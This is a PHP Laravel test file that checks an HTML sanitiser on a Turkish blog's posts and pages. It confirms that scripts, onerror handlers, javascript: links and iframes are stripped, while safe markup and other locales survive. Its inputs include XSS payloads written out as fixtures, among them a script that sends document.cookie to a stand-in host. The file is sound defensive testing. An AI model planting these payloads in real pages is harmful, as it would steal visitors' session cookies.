<?php

namespace Tests\Feature;

use App\Models\Page;
use App\Models\Post;
use App\Support\HtmlSanitize;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class HtmlSanitizationTest extends TestCase
{
    use RefreshDatabase;

    /**
     * `HasTranslations::getAttribute()` returns the value for the current
     * locale, so the raw `{tr, en}` map has to be read off the attributes.
     */
    private function rawContent(Model $model): string
    {
        $raw = $model->fresh()->getAttributes()['content'] ?? '';
        $decoded = is_string($raw) ? (json_decode($raw, true) ?: []) : $raw;

        return (string) ($decoded['tr'] ?? '');
    }

    private function publishPost(string $content, ?string $slug = null): Post
    {
        $slug ??= 'yazi-'.uniqid();

        return Post::create([
            'title' => ['tr' => 'Başlık'],
            'slug' => ['tr' => $slug],
            'content' => ['tr' => $content],
            'is_published' => true,
        ]);
    }

    public function test_script_tags_are_stripped_from_post_content(): void
    {
        $post = $this->publishPost('<p>Merhaba</p><script>fetch("//evil.tld?c="+document.cookie)</script>');

        $this->assertStringNotContainsString('<script', $this->rawContent($post));
        $this->assertStringNotContainsString('document.cookie', $this->rawContent($post));
        $this->assertStringContainsString('Merhaba', $this->rawContent($post));
    }

    public function test_event_handler_attributes_are_stripped(): void
    {
        $post = $this->publishPost('<img src=x onerror="alert(1)">');

        $this->assertStringNotContainsString('onerror', $this->rawContent($post));
    }

    public function test_javascript_urls_are_stripped(): void
    {
        $post = $this->publishPost('<a href="javascript:alert(1)">tıkla</a>');

        $this->assertStringNotContainsString('javascript:', $this->rawContent($post));
    }

    public function test_iframes_are_stripped(): void
    {
        $post = $this->publishPost('<iframe src="//evil.tld"></iframe><p>sonra</p>');

        $this->assertStringNotContainsString('<iframe', $this->rawContent($post));
        $this->assertStringContainsString('sonra', $this->rawContent($post));
    }

    public function test_safe_markup_survives(): void
    {
        $post = $this->publishPost('<p><strong>Kalın</strong> ve <em>italik</em> metin</p>');

        $content = $this->rawContent($post);

        $this->assertStringContainsString('<strong>Kalın</strong>', $content);
        $this->assertStringContainsString('<em>italik</em>', $content);
    }

    public function test_safe_external_links_are_preserved(): void
    {
        $post = $this->publishPost('<a href="https://example.com" target="_blank">doküman</a>');

        $this->assertStringContainsString('https://example.com', $this->rawContent($post));
    }

    /** Sanitising one locale must not wipe the others. */
    public function test_other_locales_are_preserved(): void
    {
        $post = Post::create([
            'title' => ['tr' => 'Başlık', 'en' => 'Title'],
            'slug' => ['tr' => 'yazi-x', 'en' => 'post-x'],
            'content' => ['tr' => '<script>a()</script><p>tr içerik</p>', 'en' => '<b>english</b>'],
            'is_published' => true,
        ]);

        $raw = json_decode($post->fresh()->getAttributes()['content'], true);

        $this->assertStringNotContainsString('<script', $raw['tr']);
        $this->assertStringContainsString('tr içerik', $raw['tr']);
        $this->assertSame('<b>english</b>', $raw['en']);
    }

    public function test_page_content_is_sanitised_too(): void
    {
        $page = Page::create([
            'title' => ['tr' => 'Sayfa'],
            'slug' => ['tr' => 'sayfa-'.uniqid()],
            'content' => ['tr' => '<script>alert(1)</script><p>içerik</p>'],
            'is_published' => true,
        ]);

        $this->assertStringNotContainsString('<script', $this->rawContent($page));
        $this->assertStringContainsString('içerik', $this->rawContent($page));
    }

    /** The rendered public route must never emit the injected script. */
    public function test_public_blog_page_does_not_render_injected_script(): void
    {
        $slug = 'guvenlik-'.uniqid();
        $this->publishPost('<script>alert("xss")</script><p>güvenli</p>', $slug);

        $this->app->setLocale('tr');

        $response = $this->get('/blog/'.$slug);

        $response->assertOk();
        $response->assertDontSee('alert("xss")', false);
        $response->assertDontSee('<script>alert', false);
    }

    public function test_sanitizer_handles_null_and_empty_values(): void
    {
        $this->assertNull(HtmlSanitize::html(null));
        $this->assertSame('', HtmlSanitize::html(''));
    }

    public function test_sanitizer_preserves_all_locales(): void
    {
        $result = HtmlSanitize::translatable([
            'tr' => '<script>a()</script><p>tr</p>',
            'en' => '<b>bold</b>',
        ]);

        $this->assertStringNotContainsString('<script', $result['tr']);
        $this->assertStringContainsString('<b>bold</b>', $result['en']);
    }
}